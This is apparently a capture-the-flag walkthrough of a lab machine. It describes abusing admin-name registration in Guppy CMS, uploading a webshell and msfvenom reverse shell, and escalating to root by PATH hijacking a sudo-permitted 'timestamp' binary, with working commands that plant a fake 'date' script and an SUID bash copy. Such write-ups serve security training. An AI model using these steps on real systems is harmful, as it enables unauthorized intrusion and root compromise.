# Port Scanning
* There's only port 80 open
# Initial Access
* The web app uses the Guppy CMS
* The first user to register a name with the string `Admin` in it will register an an admin account, e.g., `Admin2` or `Admin7`
* Once logged in, we are able to upload any file we want to, so we upload a webshell, followed by a msfvenom elf binary for the reverse shell
# Privilege Escalation
* we have sudo access with the `timestamp` binary with setenv enabled
* we notice that the `timestamp` binary seems to have the same output as the `date` command, with the `+%s` argument
* if the `timestamp` binary is not accessing the `date` command with an absolute filepath, then we can perform PATH hijacking for privilege escalation
* this means we can run the following commands to create a malicious `date` file in a writable directory:
```
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
sudo timestamp
/tmp/rootbash -p
```
* we are root
